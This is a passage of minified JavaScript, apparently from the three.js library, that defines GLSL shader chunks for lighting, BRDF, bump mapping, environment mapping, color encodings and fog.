1.04 ) * a004 + r.zw;\\n\\treturn specularColor * AB.x + AB.y;\\n}\\nfloat G_BlinnPhong_Implicit( ) {\\n\\treturn 0.25;\\n}\\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\\n\\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\\n}\\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_BlinnPhong_Implicit( );\\n\\tfloat D = D_BlinnPhong( shininess, dotNH );\\n\\treturn F * ( G * D );\\n}\\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\\n\\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\\n}\\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\\n\\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\\n}\\n\";\nTHREE.ShaderChunk.bumpmap_pars_fragment=\"#ifdef USE_BUMPMAP\\n\\tuniform sampler2D bumpMap;\\n\\tuniform float bumpScale;\\n\\tvec2 dHdxy_fwd() {\\n\\t\\tvec2 dSTdx = dFdx( vUv );\\n\\t\\tvec2 dSTdy = dFdy( vUv );\\n\\t\\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\\n\\t\\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\\n\\t\\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\\n\\t\\treturn vec2( dBx, dBy );\\n\\t}\\n\\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\\n\\t\\tvec3 vSigmaX = dFdx( surf_pos );\\n\\t\\tvec3 vSigmaY = dFdy( surf_pos );\\n\\t\\tvec3 vN = surf_norm;\\n\\t\\tvec3 R1 = cross( vSigmaY, vN );\\n\\t\\tvec3 R2 = cross( vN, vSigmaX );\\n\\t\\tfloat fDet = dot( vSigmaX, R1 );\\n\\t\\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\\n\\t\\treturn normalize( abs( fDet ) * surf_norm - vGrad );\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.clipping_planes_fragment=\"#if NUM_CLIPPING_PLANES > 0\\n\\tfor ( int i = 0; i < NUM_CLIPPING_PLANES; ++ i ) {\\n\\t\\tvec4 plane = clippingPlanes[ i ];\\n\\t\\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\\n\\t}\\n#endif\\n\";THREE.ShaderChunk.clipping_planes_pars_fragment=\"#if NUM_CLIPPING_PLANES > 0\\n\\t#if ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\t\\tvarying vec3 vViewPosition;\\n\\t#endif\\n\\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\\n#endif\\n\";\nTHREE.ShaderChunk.clipping_planes_pars_vertex=\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n\";THREE.ShaderChunk.clipping_planes_vertex=\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n\";THREE.ShaderChunk.color_fragment=\"#ifdef USE_COLOR\\n\\tdiffuseColor.rgb *= vColor;\\n#endif\";THREE.ShaderChunk.color_pars_fragment=\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\\n\";\nTHREE.ShaderChunk.color_pars_vertex=\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\";THREE.ShaderChunk.color_vertex=\"#ifdef USE_COLOR\\n\\tvColor.xyz = color.xyz;\\n#endif\";THREE.ShaderChunk.common=\"#define PI 3.14159265359\\n#define PI2 6.28318530718\\n#define RECIPROCAL_PI 0.31830988618\\n#define RECIPROCAL_PI2 0.15915494\\n#define LOG2 1.442695\\n#define EPSILON 1e-6\\n#define saturate(a) clamp( a, 0.0, 1.0 )\\n#define whiteCompliment(a) ( 1.0 - saturate( a ) )\\nfloat pow2( const in float x ) { return x*x; }\\nfloat pow3( const in float x ) { return x*x*x; }\\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\\nhighp float rand( const in vec2 uv ) {\\n\\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\\n\\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\\n\\treturn fract(sin(sn) * c);\\n}\\nstruct IncidentLight {\\n\\tvec3 color;\\n\\tvec3 direction;\\n\\tbool visible;\\n};\\nstruct ReflectedLight {\\n\\tvec3 directDiffuse;\\n\\tvec3 directSpecular;\\n\\tvec3 indirectDiffuse;\\n\\tvec3 indirectSpecular;\\n};\\nstruct GeometricContext {\\n\\tvec3 position;\\n\\tvec3 normal;\\n\\tvec3 viewDir;\\n};\\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\\n}\\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\\n}\\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\tfloat distance = dot( planeNormal, point - pointOnPlane );\\n\\treturn - distance * planeNormal + point;\\n}\\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn sign( dot( point - pointOnPlane, planeNormal ) );\\n}\\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\\n}\\n\";\nTHREE.ShaderChunk.cube_uv_reflection_fragment=\"#ifdef ENVMAP_TYPE_CUBE_UV\\n#define cubeUV_textureSize (1024.0)\\nint getFaceFromDirection(vec3 direction) {\\n\\tvec3 absDirection = abs(direction);\\n\\tint face = -1;\\n\\tif( absDirection.x > absDirection.z ) {\\n\\t\\tif(absDirection.x > absDirection.y )\\n\\t\\t\\tface = direction.x > 0.0 ? 0 : 3;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\telse {\\n\\t\\tif(absDirection.z > absDirection.y )\\n\\t\\t\\tface = direction.z > 0.0 ? 2 : 5;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\treturn face;\\n}\\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\\n\\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\\n\\tfloat dxRoughness = dFdx(roughness);\\n\\tfloat dyRoughness = dFdy(roughness);\\n\\tvec3 dx = dFdx( vec * scale * dxRoughness );\\n\\tvec3 dy = dFdy( vec * scale * dyRoughness );\\n\\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\\n\\td = clamp(d, 1.0, cubeUV_rangeClamp);\\n\\tfloat mipLevel = 0.5 * log2(d);\\n\\treturn vec2(floor(mipLevel), fract(mipLevel));\\n}\\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\\n\\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\\n\\tfloat a = 16.0 * cubeUV_rcpTextureSize;\\n\\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\\n\\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\\n\\tfloat powScale = exp2_packed.x * exp2_packed.y;\\n\\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\\n\\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\\n\\tbool bRes = mipLevel == 0.0;\\n\\tscale =  bRes && (scale < a) ? a : scale;\\n\\tvec3 r;\\n\\tvec2 offset;\\n\\tint face = getFaceFromDirection(direction);\\n\\tfloat rcpPowScale = 1.0 / powScale;\\n\\tif( face == 0) {\\n\\t\\tr = vec3(direction.x, -direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 1) {\\n\\t\\tr = vec3(direction.y, direction.x, direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 2) {\\n\\t\\tr = vec3(direction.z, direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 3) {\\n\\t\\tr = vec3(direction.x, direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\telse if( face == 4) {\\n\\t\\tr = vec3(direction.y, direction.x, -direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\telse {\\n\\t\\tr = vec3(direction.z, -direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\tr = normalize(r);\\n\\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\\n\\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\\n\\tvec2 base = offset + vec2( texelOffset );\\n\\treturn base + s * ( scale - 2.0 * texelOffset );\\n}\\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\\nvec4 textureCubeUV(vec3 reflectedDirection, float roughness ) {\\n\\tfloat roughnessVal = roughness* cubeUV_maxLods3;\\n\\tfloat r1 = floor(roughnessVal);\\n\\tfloat r2 = r1 + 1.0;\\n\\tfloat t = fract(roughnessVal);\\n\\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\\n\\tfloat s = mipInfo.y;\\n\\tfloat level0 = mipInfo.x;\\n\\tfloat level1 = level0 + 1.0;\\n\\tlevel1 = level1 > 5.0 ? 5.0 : level1;\\n\\tlevel0 += min( floor( s + 0.5 ), 5.0 );\\n\\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\\n\\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\\n\\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\\n\\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\\n\\tvec4 result = mix(color10, color20, t);\\n\\treturn vec4(result.rgb, 1.0);\\n}\\n#endif\\n\";\nTHREE.ShaderChunk.defaultnormal_vertex=\"#ifdef FLIP_SIDED\\n\\tobjectNormal = -objectNormal;\\n#endif\\nvec3 transformedNormal = normalMatrix * objectNormal;\\n\";THREE.ShaderChunk.displacementmap_vertex=\"#ifdef USE_DISPLACEMENTMAP\\n\\ttransformed += normal * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\\n#endif\\n\";THREE.ShaderChunk.displacementmap_pars_vertex=\"#ifdef USE_DISPLACEMENTMAP\\n\\tuniform sampler2D displacementMap;\\n\\tuniform float displacementScale;\\n\\tuniform float displacementBias;\\n#endif\\n\";\nTHREE.ShaderChunk.emissivemap_fragment=\"#ifdef USE_EMISSIVEMAP\\n\\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\\n\\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\\n\\ttotalEmissiveRadiance *= emissiveColor.rgb;\\n#endif\\n\";THREE.ShaderChunk.emissivemap_pars_fragment=\"#ifdef USE_EMISSIVEMAP\\n\\tuniform sampler2D emissiveMap;\\n#endif\\n\";THREE.ShaderChunk.encodings_pars_fragment=\"\\nvec4 LinearToLinear( in vec4 value ) {\\n  return value;\\n}\\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\\n  return vec4( pow( value.xyz, vec3( gammaFactor ) ), value.w );\\n}\\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\\n  return vec4( pow( value.xyz, vec3( 1.0 / gammaFactor ) ), value.w );\\n}\\nvec4 sRGBToLinear( in vec4 value ) {\\n  return vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.w );\\n}\\nvec4 LinearTosRGB( in vec4 value ) {\\n  return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.w );\\n}\\nvec4 RGBEToLinear( in vec4 value ) {\\n  return vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\\n}\\nvec4 LinearToRGBE( in vec4 value ) {\\n  float maxComponent = max( max( value.r, value.g ), value.b );\\n  float fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\\n  return vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\\n}\\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\\n  return vec4( value.xyz * value.w * maxRange, 1.0 );\\n}\\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\\n  float maxRGB = max( value.x, max( value.g, value.b ) );\\n  float M      = clamp( maxRGB / maxRange, 0.0, 1.0 );\\n  M            = ceil( M * 255.0 ) / 255.0;\\n  return vec4( value.rgb / ( M * maxRange ), M );\\n}\\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\\n    return vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\\n}\\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\\n    float maxRGB = max( value.x, max( value.g, value.b ) );\\n    float D      = max( maxRange / maxRGB, 1.0 );\\n    D            = min( floor( D ) / 255.0, 1.0 );\\n    return vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\\n}\\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\\nvec4 LinearToLogLuv( in vec4 value )  {\\n  vec3 Xp_Y_XYZp = value.rgb * cLogLuvM;\\n  Xp_Y_XYZp = max(Xp_Y_XYZp, vec3(1e-6, 1e-6, 1e-6));\\n  vec4 vResult;\\n  vResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\\n  float Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\\n  vResult.w = fract(Le);\\n  vResult.z = (Le - (floor(vResult.w*255.0))/255.0)/255.0;\\n  return vResult;\\n}\\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\\nvec4 LogLuvToLinear( in vec4 value ) {\\n  float Le = value.z * 255.0 + value.w;\\n  vec3 Xp_Y_XYZp;\\n  Xp_Y_XYZp.y = exp2((Le - 127.0) / 2.0);\\n  Xp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\\n  Xp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\\n  vec3 vRGB = Xp_Y_XYZp.rgb * cLogLuvInverseM;\\n  return vec4( max(vRGB, 0.0), 1.0 );\\n}\\n\";\nTHREE.ShaderChunk.encodings_fragment=\"  gl_FragColor = linearToOutputTexel( gl_FragColor );\\n\";THREE.ShaderChunk.envmap_fragment=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#else\\n\\t\\tvec3 reflectVec = vReflect;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tvec4 envColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\\n\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\tvec2 sampleUV;\\n\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\tvec4 envColor = texture2D( envMap, sampleUV );\\n\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\\n\\t\\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\\n\\t#endif\\n\\tenvColor = envMapTexelToLinear( envColor );\\n\\t#ifdef ENVMAP_BLENDING_MULTIPLY\\n\\t\\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_MIX )\\n\\t\\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_ADD )\\n\\t\\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.envmap_pars_fragment=\"#if defined( USE_ENVMAP ) || defined( PHYSICAL )\\n\\tuniform float reflectivity;\\n\\tuniform float envMapIntenstiy;\\n#endif\\n#ifdef USE_ENVMAP\\n\\t#if ! defined( PHYSICAL ) && ( defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tuniform samplerCube envMap;\\n\\t#else\\n\\t\\tuniform sampler2D envMap;\\n\\t#endif\\n\\tuniform float flipEnvMap;\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( PHYSICAL )\\n\\t\\tuniform float refractionRatio;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.envmap_pars_vertex=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t\\tuniform float refractionRatio;\\n\\t#endif\\n#endif\\n\";THREE.ShaderChunk.envmap_vertex=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvWorldPosition = worldPosition.xyz;\\n\\t#else\\n\\t\\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvReflect = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.fog_fragment=\"#ifdef USE_FOG\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tfloat depth = gl_FragDepthEXT / gl_FragCoord.w;\\n\\t#else\\n\\t\\tfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\n\\t#endif\\n\\t#ifdef FOG_EXP2\\n\\t\\tfloat fogFactor = whiteCompliment( exp2( - fogDensity * fogDensity * depth * depth * LOG2 ) );\\n\\t#else\\n\\t\\tfloat fogFactor = smoothstep( fogNear, fogFar, depth );\\n\\t#endif\\n\\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\\n#endif\\n\";\nTHREE.ShaderChunk.fog_pars_fragment=\"#ifdef USE_FOG\\n\\tuniform vec3 fogColor;\\n\\t#ifdef FOG_EXP2\\n\\t\\tuniform float fogDensity;\\n\\t#else\\n\\t\\tuniform float fogNear;\\n\\t\\tuniform float fogFar;\\n\\t#endif\\n#endif\";THREE.ShaderChunk.lightmap_fragment=\"#ifdef USE_LIGHTMAP\\n\\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n#endif\\n\";THREE.ShaderChunk.lightmap_pars_fragment=\"#ifdef USE_LIGHTMAP\\n\\tuniform sampler2D lightMap;\\n\\tuniform float lightMapIntensity;\\n#endif\";\nTHREE.ShaderChunk.lights_lambert_vertex=\"vec3 diffuse = vec3( 1.0 );\\nGeometricContext geometry;\\ngeometry.position = mvPosition.xyz;\\ngeometry.normal = normalize( transformedNormal );\\ngeometry.viewDir = normalize( -mvPosition.xyz );\\nGeometricContext backGeometry;\\nbackGeometry.position = geometry.position;\\nbackGeometry.normal = -geometry.normal;\\nbackGeometry.viewDir = geometry.viewDir;\\nvLightFront = vec3( 0.0 );\\n#ifdef DOUBLE_SIDED\\n\\tvLightBack = vec3( 0.0 );\\n#endif\\nIncidentLight directLight;\\nfloat dotNL;\\nvec3 directLightColor_Diffuse;\\n#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\tvLightFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.lights_pars=\"uniform vec3 ambientLightColor;\\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\\n\\tvec3 irradiance = ambientLightColor;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treturn irradiance;\\n}\\n#if NUM_DIR_LIGHTS > 0\\n\\tstruct DirectionalLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\\n\\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tdirectLight.color = directionalLight.color;\\n\\t\\tdirectLight.direction = directionalLight.direction;\\n\\t\\tdirectLight.visible = true;\\n\\t}\\n#endif\\n#if NUM_POINT_LIGHTS > 0\\n\\tstruct PointLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\\n\\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tvec3 lVector = pointLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tif ( testLightInRange( lightDistance, pointLight.distance ) ) {\\n\\t\\t\\tdirectLight.color = pointLight.color;\\n\\t\\t\\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tstruct SpotLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tfloat coneCos;\\n\\t\\tfloat penumbraCos;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\\n\\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\\n\\t\\tvec3 lVector = spotLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tfloat angleCos = dot( directLight.direction, spotLight.direction );\\n\\t\\tif ( all( bvec2( angleCos > spotLight.coneCos, testLightInRange( lightDistance, spotLight.distance ) ) ) ) {\\n\\t\\t\\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\\n\\t\\t\\tdirectLight.color = spotLight.color;\\n\\t\\t\\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tstruct HemisphereLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 skyColor;\\n\\t\\tvec3 groundColor;\\n\\t};\\n\\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\\n\\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\\n\\t\\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\\n\\t\\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\\n\\t\\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tirradiance *= PI;\\n\\t\\t#endif\\n\\t\\treturn irradiance;\\n\\t}\\n#endif\\n#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\\n\\t\\t#include 